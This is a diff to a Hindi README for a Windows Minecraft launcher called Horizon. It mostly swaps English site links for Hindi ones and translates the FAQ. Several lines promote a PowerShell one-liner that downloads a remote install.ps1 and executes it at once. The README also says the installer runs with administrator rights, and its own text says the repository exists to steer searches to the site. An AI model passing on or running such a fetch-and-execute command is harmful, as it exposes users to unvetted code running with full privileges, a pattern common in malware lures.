@@ -16,7 +16,7 @@ powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"
 
 <p align="center">
   <a href="https://horizonlauncher.net/horizon-launcher-setup.exe"><strong>सामान्य इंस्टॉल — Horizon डाउनलोड setup.exe</strong></a>
-  · <a href="https://horizonlauncher.net/en/download-horizon/">Horizon डाउनलोड</a>
+  · <a href="https://horizonlauncher.net/hi/download-horizon/">Horizon डाउनलोड</a>
   · <a href="https://horizonlauncher.net/">horizonlauncher.net</a>
   · <a href="https://t.me/horizonlauncher">Telegram</a>
 </p>
@@ -46,13 +46,13 @@ powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"
 
 <p align="center">
   <a href="https://horizonlauncher.net/"><strong>आधिकारिक साइट horizonlauncher.net</strong></a> ·
-  <a href="https://horizonlauncher.net/en/minecraft-rust/">Rust पर Minecraft</a> ·
-  <a href="https://horizonlauncher.net/en/faq/">FAQ</a> ·
+  <a href="https://horizonlauncher.net/hi/minecraft-rust/">Rust पर Minecraft</a> ·
+  <a href="https://horizonlauncher.net/hi/faq/">FAQ</a> ·
   <a href="https://t.me/horizonlauncher">Telegram</a>
 </p>
 
 <p align="center">
-  <a href="https://horizonlauncher.net/en/download-horizon/"><img alt="Win+R" src="https://img.shields.io/badge/Win+R-install.ps1-1a120c?style=for-the-badge"></a>
+  <a href="https://horizonlauncher.net/hi/download-horizon/"><img alt="Win+R" src="https://img.shields.io/badge/Win+R-install.ps1-1a120c?style=for-the-badge"></a>
   <a href="https://horizonlauncher.net/horizon-launcher-setup.exe"><img alt="Horizon डाउनलोड" src="https://img.shields.io/badge/Download_Horizon-Windows_setup-1a120c?style=for-the-badge"></a>
   <a href="https://horizonlauncher.net/"><img alt="horizonlauncher.net" src="https://img.shields.io/badge/Site-horizonlauncher.net-c45c26?style=for-the-badge"></a>
   <a href="https://t.me/horizonlauncher"><img alt="Telegram" src="https://img.shields.io/badge/Telegram-t.me/horizonlauncher-26A5E4?style=for-the-badge"></a>
@@ -71,7 +71,7 @@ powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"
 
 <p align="center"><em>अपडेट 2026-11-16: लॉन्चर <strong>0.2.69</strong>, LGPL, Win+R, UAC. <a href="https://horizonlauncher.net/hi/">horizonlauncher.net</a>.</em></p>
 
-[![Horizon Minecraft](https://horizonlauncher.net/media/social-preview.jpg)](https://horizonlauncher.net/hi/)
+[![Horizon Minecraft Rust डाउनलोड](https://horizonlauncher.net/media/social-preview.jpg)](https://horizonlauncher.net/hi/)
 
 
 ## Horizon के वीडियो और GIF
@@ -136,7 +136,7 @@ Horizon Mojang / Microsoft का **नहीं** है। सिर्फ़ 
 7. [सर्वर, मॉड, FPS](#सरवर-मड-fps)
 8. [FAQ](#faq)
 9. [साइट पेज](#सइट-पज)
-10. [English — Download Horizon Minecraft launcher](#english-download-horizon-minecraft-launcher)
+10. [English — Horizon Minecraft launcher डाउनलोड](#english-horizon-minecraft-launcher-डउनलड)
 11. [SEO टैग और सर्च](#seo-टग-और-सरच)
 
 ---
@@ -180,10 +180,10 @@ Horizon चलता रहता है: पैच नियमित आते
 
 | | |
 |---|---|
-| Horizon डाउनलोड | [https://horizonlauncher.net/en/download-horizon/](https://horizonlauncher.net/en/download-horizon/) |
-| लॉन्चर इंस्टॉल करें | [https://horizonlauncher.net/en/install-horizon/](https://horizonlauncher.net/en/install-horizon/) |
+| Horizon डाउनलोड | [https://horizonlauncher.net/hi/download-horizon/](https://horizonlauncher.net/hi/download-horizon/) |
+| लॉन्चर इंस्टॉल करें | [https://horizonlauncher.net/hi/install-horizon/](https://horizonlauncher.net/hi/install-horizon/) |
 | Setup `.exe` | [https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe) |
-| Rust पर Minecraft | [https://horizonlauncher.net/en/minecraft-rust/](https://horizonlauncher.net/en/minecraft-rust/) |
+| Rust पर Minecraft | [https://horizonlauncher.net/hi/minecraft-rust/](https://horizonlauncher.net/hi/minecraft-rust/) |
 | आधिकारिक साइट horizonlauncher.net | [https://horizonlauncher.net](https://horizonlauncher.net) |
 
 **ज़रूरतें**
@@ -216,7 +216,7 @@ powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"
 
 इंस्टॉलर और लॉन्चर एडमिनistrator (UAC) के तौर पर चलते हैं — Windows संकेत स्वीकार करें। कमांड `install.ps1` सिर्फ़ horizonlauncher.net से लेती है।
 
-पूरी गाइड: [https://horizonlauncher.net/en/install-horizon/](https://horizonlauncher.net/en/install-horizon/) · [https://horizonlauncher.net/en/download-horizon/](https://horizonlauncher.net/en/download-horizon/)
+पूरी गाइड: [https://horizonlauncher.net/hi/install-horizon/](https://horizonlauncher.net/hi/install-horizon/) · [https://horizonlauncher.net/hi/download-horizon/](https://horizonlauncher.net/hi/download-horizon/)
 
 ### तरीका 2. सामान्य इंस्टॉल (setup.exe)
 
@@ -266,7 +266,7 @@ Win+R: `irm https://horizonlauncher.net/install.ps1 | iex` · **[horizon-launche
 - बिना मैनुअल JDK के Windows लॉन्चर;
 - डिस्क पर पहले से मौजूद कोई भी गेम वर्शन।
 
-और पढ़ें: [https://horizonlauncher.net/en/minecraft-rust/](https://horizonlauncher.net/en/minecraft-rust/) · [https://horizonlauncher.net/en/performance/](https://horizonlauncher.net/en/performance/)
+और पढ़ें: [https://horizonlauncher.net/hi/minecraft-rust/](https://horizonlauncher.net/hi/minecraft-rust/) · [https://horizonlauncher.net/hi/performance/](https://horizonlauncher.net/hi/performance/)
 
 ## लॉन्चर तुलना
 
@@ -313,24 +313,28 @@ Horizon के Rust क्लाइंट के लिए नहीं।
 [Releases](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases) · लॉन्चर **0.2.69** [https://horizonlauncher.net/hi/](https://horizonlauncher.net/hi/)
 
 **Windows 7 / macOS / Linux?**  
-Setup targets **Windows 10/11 x64**. See [https://horizonlauncher.net/en/download-horizon/](https://horizonlauncher.net/en/download-horizon/).
+केवल **Windows 10/11 x64**. [https://horizonlauncher.net/hi/download-horizon/](https://horizonlauncher.net/hi/download-horizon/).
 
-**Russian version?**  
-[https://horizonlauncher.net/](https://horizonlauncher.net/) — скачать Horizon (README.md).
+**रूसी संस्करण?**  
+[https://horizonlauncher.net/](https://horizonlauncher.net/) — मुख्य README रूसी में.
 
-**Why GitHub if the site exists?**  
-So «Horizon launcher github» points to **[horizonlauncher.net](https://horizonlauncher.net/en/)**.
+**GitHub क्यों?**  
+ताकि «Horizon launcher github» खोज **[horizonlauncher.net](https://horizonlauncher.net/hi/)** पर जाए.
 
 ## साइट पेज
 
-**HI:** [https://horizonlauncher.net/hi/](https://horizonlauncher.net/hi/) · [https://horizonlauncher.net/hi/download-horizon/](https://horizonlauncher.net/hi/download-horizon/) · [https://horizonlauncher.net/hi/install-horizon/](https://horizonlauncher.net/hi/install-horizon/) · [https://horizonlauncher.net/hi/minecraft-rust/](https://horizonlauncher.net/hi/minecraft-rust/) · [https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)
+**हिन्दी:** [https://horizonlauncher.net/hi/](https://horizonlauncher.net/hi/) · [https://horizonlauncher.net/hi/download-horizon/](https://horizonlauncher.net/hi/download-horizon/) · [https://horizonlauncher.net/hi/install-horizon/](https://horizonlauncher.net/hi/install-horizon/) · [https://horizonlauncher.net/hi/minecraft-rust/](https://horizonlauncher.net/hi/minecraft-rust/) · [https://horizonlauncher.net/gallery/](https://horizonlauncher.net/gallery/) · [https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)
 
-**EN:** [https://horizonlauncher.net/en/](https://horizonlauncher.net/en/) · **RU:** [https://horizonlauncher.net/](https://horizonlauncher.net/) · [sitemap](https://horizonlauncher.net/sitemap.xml) · [Telegram](https://t.me/horizonlauncher)
+**English:** [https://horizonlauncher.net/en/](https://horizonlauncher.net/en/) · [https://horizonlauncher.net/en/download-horizon/](https://horizonlauncher.net/en/download-horizon/)
+
+**Русский:** [https://horizonlauncher.net/](https://horizonlauncher.net/) · [https://horizonlauncher.net/download-horizon/](https://horizonlauncher.net/download-horizon/)
+
+[साइटमैप](https://horizonlauncher.net/sitemap.xml) · [Telegram](https://t.me/horizonlauncher)
 
 
-## English — Download Horizon Minecraft launcher
+## English — Horizon Minecraft launcher डाउनलोड
 
-**Horizon** — free **Windows Minecraft launcher** and **Java client in Rust**. [https://horizonlauncher.net/en/](https://horizonlauncher.net/en/) · [https://horizonlauncher.net/en/download-horizon/](https://horizonlauncher.net/en/download-horizon/) · **[https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)** · **0.2.69**.
+**Horizon** एक मुफ़्त **Windows Minecraft launcher** और **Rust में Java क्लाइंट** (Minecraft Rust Edition) है। अंग्रेज़ी canonical पेज: [https://horizonlauncher.net/en/](https://horizonlauncher.net/en/) · [https://horizonlauncher.net/en/download-horizon/](https://horizonlauncher.net/en/download-horizon/) · **[https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)** · **0.2.69**. Mojang/Microsoft आधिकारिक नहीं।
 
 
 ## SEO टैग और सर्च
@@ -341,14 +345,14 @@ So «Horizon launcher github» points to **[horizonlauncher.net](https://horizon
 
 ### डाउनलोड / Win+R / setup.exe
 
-- [https://horizonlauncher.net/](https://horizonlauncher.net/)
-- [https://horizonlauncher.net/en/download-horizon/](https://horizonlauncher.net/en/download-horizon/)
-- Win+R: `powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"`
-- [https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)
-- [https://horizonlauncher.net/en/](https://horizonlauncher.net/en/)
-- [https://horizonlauncher.net/minecraft-rust/](https://horizonlauncher.net/minecraft-rust/) · [https://horizonlauncher.net/en/minecraft-rust/](https://horizonlauncher.net/en/minecraft-rust/)
-- [https://t.me/horizonlauncher](https://t.me/horizonlauncher)
-- [https://horizonlauncher.net/sitemap.xml](https://horizonlauncher.net/sitemap.xml)
+- **साइट:** [https://horizonlauncher.net/hi/](https://horizonlauncher.net/hi/) · [https://horizonlauncher.net/](https://horizonlauncher.net/)
+- **डाउनलोड:** [https://horizonlauncher.net/hi/download-horizon/](https://horizonlauncher.net/hi/download-horizon/)
+- **Win+R:** `powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"`
+- **सेटअप:** [https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)
+- **EN:** [https://horizonlauncher.net/en/](https://horizonlauncher.net/en/) · [https://horizonlauncher.net/en/download-horizon/](https://horizonlauncher.net/en/download-horizon/)
+- **Rust में Minecraft:** [https://horizonlauncher.net/hi/minecraft-rust/](https://horizonlauncher.net/hi/minecraft-rust/) · [https://horizonlauncher.net/en/minecraft-rust/](https://horizonlauncher.net/en/minecraft-rust/)
+- **Telegram:** [https://t.me/horizonlauncher](https://t.me/horizonlauncher)
+- **साइटमैप:** [https://horizonlauncher.net/sitemap.xml](https://horizonlauncher.net/sitemap.xml)
 
 
 **डाउनलोड:** [https://horizonlauncher.net/hi/](https://horizonlauncher.net/hi/) · [https://horizonlauncher.net/hi/download-horizon/](https://horizonlauncher.net/hi/download-horizon/) · [https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)
